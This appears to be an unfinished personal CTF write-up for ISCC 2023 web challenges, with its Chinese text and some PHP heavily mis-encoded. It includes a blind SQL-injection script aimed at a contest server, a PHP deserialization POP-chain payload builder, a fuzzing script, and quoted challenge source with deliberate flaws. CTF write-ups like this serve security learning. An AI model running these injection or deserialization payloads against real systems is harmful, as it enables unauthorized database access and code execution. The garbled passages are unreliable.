
# web
### ç¾Šäº†ä¸ªğŸ
å‰ç«¯js,ç›´æ¥æ‰¾åˆ°flag,ä¿©æ¬¡base64
### ISCCç–¯ç‹‚è´­ç‰©èŠ‚-1



```python
import requests
import time

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'name=gAAAAABkT_RyRtKOBVDHcj2Dz7JA-bv5ts8shQRi3AAStnepiJERrnqi6K5Sfbo80ZKHRfm_PBIJpzwg8dEcb-8jp7WbJgYdlN4YVVdYAIlAcIEK9LYv55n5jDGMRsJkyr9uD80we1w5l_Ft4xWlN7pFBv8z4VzysPI6noJ0S-YeYSZRWzSYxDo=; session=eyJsZXZlbCI6MSwidXNlciI6InZpc2l0b3IifQ.ZFDaeQ.Eac2detE972G8pW-XYuJXhrG2LI; csrftoken=voP9Ffzzs3nw49SYk8YnO1DdHLZMstcAqXB5fDmHvgnZxEnAuw1EaO97A2o941NZ; sessionid=z64ahwil0wgjt4v6dslmaghxdxua0blj',
    'Proxy-Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'
}
url="http://47.94.14.162:10001/Details/search?id=487561 || hex(database()) div {0} -{1}"
result=''
length=10000000
for i in range(10):
    for j in range(10):
        j=result+str(j)
        print(i)
        url_new=url.format(length,j)
        r=requests.get(url_new,headers=headers)
        # print(r.text)
        print(url_new,r.status_code)
        time.sleep(1)
        if '487561'  in r.text:
            print('!!!',j)
            result+=str(j)
            break
    length=length//10
```

å‹‰å‹‰å¼ºå¼ºæ³¨å…¥ä¸ªåº“å

### Where_is_your_love

```php
?> <?php
// include("./xxxiscc.php");
class boy {
    public $like;
    public function __destruct() {
        echo "èƒ½è¯·ä½ å–æ¯å¥¶èŒ¶å—ï¼Ÿ<br>";
        @$this->like->make_friends();
    }
    public function __toString() {
        echo "æ‹±ç«å¤§æ³•å¥½<br>";
        return $this->like->string;
    }
}

class girl {
    private $boyname;
    public function __construct($boyname){
        $this->boyname=$boyname;
    }
    public function __call($func, $args) {
        echo "æˆ‘å®³ç¾ç¾<br>";
        isset($this->boyname->name);  
    }
}

class helper {
    private $name;
    private $string;

    public function __construct($string,$name) {
        $this->string = $string;
        $this->name = $name;
    }
    public function __isset($val) {
        echo "åƒšæœºä¸Šçº¿<br>";
        echo $this->name;
    }
    public function __get($name) {
        echo($name);
        echo "åƒšæœºä¸æ‡ˆåŠªåŠ›<br>";
        $var = $this->$name;
        $var[$name]();
    }
}
class love_story {
    public function love() {
        echo "çˆ±æƒ…èŒèŠ½<br>";
        array_walk($this, function($make, $colo){
            echo "å å…¥çˆ±æ²³ï¼Œç»™ä½ çˆ±çš„å¯†ç <br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        });
    }
}

// if (isset($_GET["iscc"])) {
//     $a=unserialize($_GET['iscc']);
// } else {
//     highlight_file(__FILE__);
// }

//pop: boy[destruct]->girl[call]->helper[isset]->boy[toString]->helper[get]->love_story

$f=new love_story();
$c=new helper(array("string"=>"love_story::love"),"");
$a=new boy();
$d=new boy();
$d->like=$c;
$e=new helper("",$d);
$b=new girl($e);
$a->like=$b;



echo(urlencode(serialize($a)));

```
åºåˆ—åŒ–å¡åœ¨äº†è°ƒç”¨love_storyæ—¶,è°ƒç”¨$thiså¿…é¡»æ˜¯å®ä¾‹,è€Œä¸”æˆ‘ä¹Ÿä¸çŸ¥é“makeå’Œcoloæ€ä¹ˆä¼ å‚,

---
åœ¨æœ€åä¸€æ­¥
`$c=new helper(array("string"=>array($f,'love')),"");`
å¹¶ä¸”ä¸ºlove_storyç±»è®¾ç½® å±æ€§
`    public $fall_in_love=array('girl_and_boy');`

### ä¸Šå¤§å·è¯´è¯
zero solve
å…ˆfuzzä¸€ä¸‹ç™½åå•
```python
import requests

url = 'http://47.94.14.162:10004/'  # å°†URLæ›¿æ¢ä¸ºç›®æ ‡URL
ascii_codes = []

for i in range(128):
    data = {'input_field': chr(i)}
    response = requests.post(url, data=data)
    if 'å“¦!' in response.text:
        ascii_codes.append(i)

print('åŒ…å«"å“¦!"çš„ASCIIç ä¸ºï¼š', ascii_codes)

```

```black
{
$
@
&
-
\
;

```





### å°å‘¨çš„å¯†ç é”
çˆ†ç ´password2=5æ—¶
```php
<?phpÂ Â Â Â 
functionÂ MyHashCode($str)  
Â Â Â Â {Â Â Â Â Â Â Â Â $hÂ =Â 0;Â Â Â Â Â Â Â Â $lenÂ =Â strlen($str);  
Â Â Â Â Â Â Â Â forÂ ($iÂ =Â 0;Â $iÂ <Â $len;Â $i++)Â {Â Â Â Â Â Â Â Â Â Â Â Â $hashÂ =Â intval40(intval40(40Â *Â $hash)Â +Â ord($str[$i]));  
Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â returnÂ abs($hash);  
Â Â Â Â }  
Â Â Â Â   
Â Â Â Â functionÂ intval40($code)  
Â Â Â Â {Â Â Â Â Â Â Â Â $falgÂ =Â $codeÂ >>Â 32;  
Â Â Â Â Â Â Â Â ifÂ ($falgÂ ==Â 1)Â {Â Â Â Â Â Â Â Â Â Â Â Â $codeÂ =Â ~($codeÂ -Â 1);  
Â Â Â Â Â Â Â Â Â Â Â Â returnÂ $codeÂ *Â -1;  
Â Â Â Â Â Â Â Â }Â elseÂ {  
Â Â Â Â Â Â Â Â Â Â Â Â returnÂ $code;  
Â Â Â Â Â Â Â Â }  
Â Â Â Â }  
Â Â Â Â functionÂ Checked($str){Â Â Â Â Â Â Â Â $p1Â =Â '/ISCC/';  
Â Â Â Â Â Â Â Â ifÂ (preg_match($p1,Â $str)){  
Â Â Â Â Â Â Â Â Â Â Â Â returnÂ false;  
Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â returnÂ true;  
Â Â Â Â }  
  
Â Â Â Â functionÂ SecurityCheck($sha1,$sha2,$user){Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â $p1Â =Â '/^[a-z]+$/';Â Â Â Â Â Â Â Â $p2Â =Â '/^[A-Z]+$/';  
  
Â Â Â Â Â Â Â Â ifÂ (preg_match($p1,Â $sha1)Â &&Â preg_match($p2,Â $sha2)){Â Â Â Â Â Â Â Â Â Â Â Â $sha1Â =Â strtoupper($sha1);Â Â Â Â Â Â Â Â Â Â Â Â $sha2Â =Â strtolower($sha2);Â Â Â Â Â Â Â Â Â Â Â Â $userÂ =Â strtoupper($user);Â Â Â Â Â Â Â Â Â Â Â Â $cryptoÂ =Â $sha1Â ^Â $sha2;  
Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â else{  
Â Â Â Â Â Â Â Â Â Â Â Â die("wrong");  
Â Â Â Â Â Â Â Â }Â Â Â Â Â Â Â   
  
Â Â Â Â Â Â Â Â returnÂ array($crypto,Â $user);  
Â Â Â Â }Â Â Â Â error_reporting(0);Â Â Â Â Â Â Â Â $userÂ =Â $_GET['username'];//userÂ Â Â Â $sha1Â =Â $_GET['sha1'];//sha1Â Â Â Â $sha2Â =Â $_GET['â€®â¦//sha2â©â¦sha2'];Â Â Â Â //â€®â¦seeÂ meÂ â©â¦canÂ youÂ Â Â Â Â ifÂ (issetÂ ($_GET['password']))Â {  
Â Â Â Â Â Â Â Â ifÂ ($_GET['password2']Â ==Â 5){Â Â Â Â Â Â Â Â Â Â Â Â show_source(__FILE__);  
Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â else{Â Â Â Â Â Â Â Â Â Â Â Â //TryÂ toÂ encryptÂ Â Â Â Â Â Â Â Â Â Â Â if(isset($sha1)Â &&Â isset($sha2)Â &&Â isset($user)){  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â [$crypto,Â $user]Â =Â SecurityCheck($sha1,$sha2,$user);  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â if((substr(sha1($crypto),-6,6)Â ===Â substr(sha1($user),-6,6))Â &&Â (substr(sha1($user),-6,6))Â ===Â 'a05c53'){//welcomeÂ toÂ ISCCÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â if((MyHashcode("ISCCNOTHARD")Â ===Â MyHashcode($_GET['password']))&&Checked($_GET['password'])){  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â include("f1ag.php");  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â echoÂ $flag;  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }else{  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â die("å°±å¿«è§£å¼€äº†!");  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â   
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â else{  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â die("çœŸçš„æƒ³ä¸èµ·æ¥å¯†ç äº†å—?");  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â Â Â Â Â }else{  
Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â die("å¯†é’¥é”™è¯¯!");  
Â Â Â Â Â Â Â Â Â Â Â Â }  
Â Â Â Â Â Â Â Â }Â Â Â Â   
Â Â Â Â }Â Â Â Â Â Â Â Â Â Â Â Â mt_srand((microtime()Â ^Â rand(1,Â 10000))Â %Â rand(1,Â 1e4)Â +Â rand(1,Â 1e4));  
?>
```

- sha-1 åå…­ä½çˆ†ç ´

- MyHashCode ç¢°æ’


### è€ç‹¼è€ç‹¼å‡ ç‚¹äº†
`?time=12` æ—¶è·å¾—æºç 

```php
1683528830 <?php
//"Hello! welcome to ISCC, wish you have a great time!";
header("Content-type:text/html;charset=utf-8");
error_reporting(0);
echo time();

class what_time_is_it{
    protected $func, $target;

    public function __construct($show_time){
        $this->func = $show_time;
    }

    public function __wakeup(){
        echo "wakeup";
    }

    public function call_func(){
        $lets_show_time = unserialize($this->filter($this->func));
        if($lets_show_time['function'] == "show_time"){
            echo 'The time is: ". date("h:i:sa", time()). "<br>';
        }
        else if($lets_show_time['function'] == "hack"){
            file_put_contents('time.php', "<?php echo 'The time is: ". date("h:i:sa", time()). "<br>';");
            echo "åšæ’šå•Šåšï¼Œä½ è¿˜æ˜¯çœ‹çœ‹æ—¶é—´å§";
            include($lets_show_time['file']);
        }
        else
            highlight_file(__file__);
    }

    private function filter($s){
        return preg_replace('/base64/i','', $s);
    }

    public function __destruct(){
        $this->call_func();
    }

}

if($_SESSION) unset($_SESSION);
$p1 = $_POST['param1'];
$p2 = $_POST['param2'];
$_SESSION['function'] = isset($_GET['func']) ? $_GET['func'] : "highlight_file";
$_SESSION['file'] = 'time.php';
if ($p1 !== $p2 && md5($p1) === md5($p2)){
    if (substr($p1, 0, 10) === strval(time())){
        echo "Just the time";
        extract($_POST);
        $_SESSION['file'] = 'time.php';
        $_SESSION['function'] = "show_time";
    }
    else{
        echo "Sorry wrong time!";
    }
}
$let_me_show_time = serialize($_SESSION)."<br>";
$a = new what_time_is_it($let_me_show_time);
```

ä¸€ç‚¹ä¸ä¼š

---


# reverse

# pwn

# crypto

# Misc


---
*ç›¸å…³wp*




2023-05-01   23:48